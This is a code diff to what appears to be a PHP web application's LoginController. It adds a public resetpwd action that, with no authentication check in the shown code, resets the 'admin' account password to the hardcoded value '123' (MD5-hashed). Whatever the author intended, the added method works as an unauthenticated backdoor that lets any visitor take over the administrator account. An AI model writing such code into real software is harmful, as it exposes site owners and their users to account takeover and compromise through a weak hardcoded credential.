@@ -9,6 +9,12 @@ class LoginController extends Controller{
 		}
 		$this->display();
 	}
+
+	public function resetpwd(){
+		$pwd = getMd5Password('123');
+		$res = D('Admin')->updatePassword('admin',$pwd);
+		echo $res;
+	}
 	
 	/**
 	 * 检测登录信息
